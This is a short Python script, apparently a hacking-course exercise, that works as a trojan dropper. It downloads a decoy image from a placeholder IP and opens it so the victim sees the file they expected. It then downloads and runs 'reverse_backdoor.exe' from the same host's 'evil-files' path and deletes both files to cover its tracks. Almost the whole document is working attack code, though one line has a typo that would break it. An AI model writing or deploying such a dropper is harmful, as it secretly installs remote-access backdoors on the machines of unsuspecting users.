#!/usr/bin/python

'''
Program will execute and download two files. One being the user requested download, and the other being
the masked evil exectuatble file (reverse_backdoor.exe).

NOTE: REQUESTS librarys only works with python 2.5.1 if we are using pyinstaller for the executable file and
packaging of the program.. 
'''

import requests, subprocess, os, tempfile

def download(url):
	get_response = requests.get(url)
	file_name = url.split("/")[-1]
	with open(file_namem "wb") as out_file:
		out_file.write(get_response.content)


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

download("http://XX.X.X.XX/evil-files/car.jpg")
#Popen program opens file
subprocess.Popen("car.jpg", shell=True)

download("http://XX.X.X.XX/evil-files/reverse_backdoor.exe")
#call will pause the program until Hacker closes the backdoor, enters exit command
subprocess.call("reverse_backdoor.exe", shell=True)

os.remove("car.jpg")
os.remove("reverse_backdoor.exe")
